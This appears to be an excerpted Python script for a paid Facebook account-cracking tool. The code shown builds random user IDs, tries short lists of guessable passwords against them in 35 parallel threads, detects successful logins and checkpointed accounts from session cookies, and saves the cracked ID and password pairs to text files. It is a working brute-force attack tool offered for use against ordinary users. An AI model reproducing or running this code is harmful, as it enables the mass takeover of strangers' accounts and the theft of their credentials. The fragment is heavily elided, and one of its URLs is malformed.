...
→   Owner      :  Md Yasin Ahmed emon 
→   Facebook   :  Md Yasin Ahmed emon 
→   Github     :  Emon1214
→   Tool Type  :  \x1b[1;91mPaid
\x1b[1;97m→   Version    :  5.2
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if Emon in ['1','01']:
				...
				os.system('xdg-open https://https://www.facebook.com/profile.php?id=100090599590773&mibextid=vk8aRt);menu()
			elif Emon in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mEmon\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[Emon-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/Emon-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[Emon-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[Emon-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/Emon-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print(' Example : 1000,2000,5000,10000,****Etc')
	linex()
...
def random_number3():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'EmonEmon','Emon12','Emon1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number4():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'Emon786','Emon44','Emon12','Emon1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number5():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'Emon123456','janjan','jan12345','Emon1122','Emon12']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example : Emon12345,bangladish,baloch,***Etc')
    linex()
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[Emon-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[Emon-CP] '+cid+' | '+ps+'\33[0;97m')
				open('Emon-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
